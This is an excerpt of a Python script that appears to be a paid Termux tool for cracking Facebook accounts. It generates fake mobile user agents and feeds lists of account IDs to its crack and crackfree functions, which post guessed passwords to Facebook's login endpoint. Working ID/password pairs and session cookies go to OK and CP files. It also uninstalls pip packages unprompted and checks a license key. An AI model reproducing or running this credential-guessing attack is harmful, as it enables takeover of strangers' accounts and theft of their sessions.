...
os.system("pip uninstall -y requests urllib3")
...
time.sleep(2)
os.system(f'xdg-open https://facebook.com/groups/termuxhackerteam/')
#------------------[ Alamin-XD ]-------------------#
#------------------[ USER-AGENT ]-------------------#
...
for xd in range(10000):
    ...
    aa='Mozilla/5.0 (Linux; Android 10; V1963A; wv) AppleWebKit/537.36 (KHTML, like Gecko)'
    ...
    l='Mobile Safari/537.36 VivoBrowser/13.7.2.1'
...
#os.system("xdg-open https://www.facebook.com/Termux.User.Tera.Next.Pappa")
#------------------[ LOGO-LAKNAT ]-----------------#
#os.system('xdg-open https://facebook.com/groups/termuxhackerteam/')
logo =""" 
\033[0;92m
   ###    ##          ###    ##     ## #### ##    ## 
  ## ##   ##         ## ##   ###   ###  ##  ###   ## 
...
##     ## ######## ##     ## ##     ## #### ##    ##
\033[1;32m---------------------------------------------------------
\033[1;32m  AUTHOR    : ALAMIN MAHAMUD
\033[1;32m  GITHUB    : ALAMIN-XD
\033[1;32m  FACEBOOK  : MD. ALAMIN ISLAM
\033[1;32m  TOOL NAME : FILE CLONE
\033[1;32m  TOOL TYPE : PAID
\033[1;32m  VERSION   : 5.3
...
def login_lagi334():
    try:
        ...
        print(logo)
        ses = requests.Session()
     #   print(""" \033[97;1m[\033[92;1m1\033[97;1m] EXTENSION : COOKIE DOUGH
# \033[97;1m[\033[92;1m2\033[97;1m] OPEN DESKTOP MODE
# \033[97;1m[\033[92;1m3\033[97;1m] GO TO : www.facebook.com/adsmanager
# \033[97;1m[\033[92;1m4\033[97;1m] THEN OPEN EXTENSION COPY COOKIE""")
       # print('\033[0;91m==================')
       # cookie = input(' \033[97;1m[\033[92;1m•\033[97;1m] ENTER COOKIE : ')
...
def main_apv():
    ...
    print("""\033[97;1m[\033[92;1m2\033[97;1m] \033[0;91mEXIT""")
    print('\033[0;97m=================')
...
def setting():
    ...
    if hu in ['1','01']:
        ...
        for bacot in id:
            ...
            id2.insert(xx,bacot)
   # print('\033[0;91m==================')
    print("\033[97;1m[\033[92;1m•\033[97;1m] METHOD LOL  ")
    print('\033[0;91m==================')
    print("\033[97;1m[\033[92;1m1\033[97;1m] METHOD 1 [\033[0;92mCookies Show \033[0;91mCP-OK-ID Show\033[1;37m]")
    print("\033[97;1m[\033[92;1m2\033[97;1m] METHOD 2 [\033[0;93mCP-OK-ID Show NO COOKIES SHOW\033[1;37m]")
    print('\033[0;91m==================')
...
def passwrd():
    os.system('clear')
    print(logo)
    print(f"\033[97;1m[\033[92;1m+\033[97;1m] USER NAME\033[1;91m :\033[1;96m "+uname)
    print('\033[97;1m[\033[92;1m+\033[97;1m] TOTAL ID \033[0;97m:\033[1;92m ',str(len(id)))
    print(f'\033[97;1m[\033[92;1m•\033[97;1m] NOTE = \33[1;92m[USE AIRPLANE MODE ON OF FOR OK IDZ] ')
    print('\033[0;97m===============================================')
...
def crack(idf,pwv):
    ...
    #sys.stdout.write(f"\r\033[100;92m{bo}[Alamin•M1]{P} [{H}{loop}{P}]>~<[{H}{len(id)}{P}] [OK{bo}•{H}{ok}{P}] [{'{:.0%}'.format(loop/float(len(id)))}{P}]\033[0;97m "),
    sys.stdout.flush()
    ...
    for pw in pwv:
        try:
            ...
            if "checkpoint" in po.cookies.get_dict().keys():
                print(f'\r\033[0;95m[Alamin\033[0;97m•\033[0;95mCp] {idf} \033[0;97m• \033[0;95m{pw}')
                ...
                print(f'\r\033[0;92m[Alamin\033[0;97m•\033[0;92mOk💚] {idf} \033[0;97m• \033[0;92m{pw}\n\033[0;93m[🌺]= COOKIES • \x1b[38;5;208m{kuki}\033[0;97m\n')
...
def crackfree(idf,pwv):
    ...
    for pw in pwv:
        try:
            ...
            po = ses.post('https://p.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
            if "checkpoint" in po.cookies.get_dict().keys():
                print(f'\r\033[0;93m[{time.strftime("%H:%M")}\033[0;97m•\033[0;93mAlamin-Cp] {idf} \033[0;97m• \033[0;93m{pw}')
                os.system('espeak -a 300 " Cp,"')
                open('CP/'+cpc,'a').write(idf+' • '+pw+'\n')
                akun.append(idf+' • '+pw)
                cp+=1
                ...
                coki=po.cookies.get_dict()
                kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print(f'\r\033[0;92m[{time.strftime("%H:%M")}\033[0;97m•\033[0;92mAlamin-Ok] {idf} \033[0;97m• \033[0;92m{pw} ')
                #cek_apk(session,coki)
                os.system('espeak -a 300 " Alamin,  Ok,  id"')
                open('OK/'+okc,'a').write(idf+' • '+pw+'\n')
                break
...
a=requests.get("https://github.com/ALAMIN-XD/Server/blob/main/Apr").text
b=str(a)
key1=open("/storage/emulated/0/android8.txt",'r').read()
key2=str(key1)  
if key2 in b:
